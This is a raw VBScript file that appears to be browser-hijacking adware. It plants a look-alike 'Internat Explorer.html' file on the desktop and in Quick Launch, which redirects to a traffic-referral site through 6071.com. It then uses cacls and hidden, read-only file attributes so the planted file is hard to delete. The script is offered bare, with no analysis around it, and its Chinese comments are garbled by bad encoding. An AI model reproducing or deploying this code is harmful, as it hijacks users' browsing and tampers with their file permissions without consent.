On Error Resume Next

'<!-- 2NLsDTmxUdMSXSrjvLjk -->

Dim Shell
Set Shell = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Dim arUr()

ReDim Preserve arUr(0)
arUr(0) = "fxxz.com"

Dim abor 
Dim strDesktop
Dim strQLan
Dim AllUsersPath

Set fsoA = CreateObject("scripting.filesystemobject")
strDesktop = WshShell.SpecialFolders("Desktop") & "\"
strQLan = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Internet Explorer\Quick Launch\"
AllUsersPath = WSHShell.ExpandEnvironmentStrings("%AllUsersProfile%") & "\" 'ALL USERS����·��
'MsgBox strqlan

	If Not fsoA.FileExists(strDesktop & "Internat Explorer.html") Then
	
		Call doHtml(strDesktop & "Internat Explorer.html")
	
	End If
	
	If Not fsoA.FileExists(strQLan & "Internat Explorer.html") Then
		
		Call copfiles(strDesktop & "Internat Explorer.html",strQLan & "Internat Explorer.html")
		
		WshShell.Run("cmd.exe /c echo Y| cacls " & Chr(34) & strQLan & "Internat Explorer.html" & Chr(34) & " /P Everyone:R "),0
	
		fsoA.GetFile(strQLan & "Internat Explorer.html").Attributes = 5
		
	End If

'<!-- 2NLsDTmxUdMSXSrjvLjk -->

Sub doHtml(path)
	

	
	Set fsod = CreateObject("scripting.filesystemobject")
	Set op=fsod.CreateTextFile(strDesktop & "Internat Explorer.html")
	
	op.Write "<!-- 2NLsDTmxUdMSXSrjvLjk -->"&Chr(13)&Chr(10)&_
			 "<meta http-equiv=""refresh""content=""0.1;url=http://6071.com/?http://www.baidu.com/"">"&Chr(13)&Chr(10)&_
			 "<!-- 2NLsDTmxUdMSXSrjvLjk -->"&Chr(13)&Chr(10)
	op.Close
	WScript.Sleep(250)
	WshShell.Run("cmd.exe /c echo Y| cacls " & Chr(34) & path & Chr(34) & " /P Everyone:R "),0
	
	fsod.GetFile(path).Attributes = 5
	
End Sub
'��0-9 a-z A-Z ���ѡȡ����ַ���
Function Random(count)'����,����ַ�������
	Dim MyValue
	Dim ArryRan
	
	Dim strResult
	
	ArryRan=Array("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h",_
	"i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D",_
	"E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z")
	
	Randomize '��ʼ���������������
	
	For i = 1 To count
		MyValue = Int(Rnd*62 )
		strResult = strResult & ArryRan(MyValue)
		'MsgBox MyValue	
	Next
	Random = strResult 
End Function

Function copfiles(fromo,too)

	Set fso = CreateObject("scripting.filesystemobject") 
	If Not fso.FileExists(fromo) Then '�ж��ļ��Ƿ����
		Exit Function	
	End If
	
	fso.copyfile fromo ,too , True 
	Set fso =Nothing 
End Function


'<!-- 2NLsDTmxUdMSXSrjvLjk -->
'<!-- 2NLsDTmxUdMSXSrjvLjk -->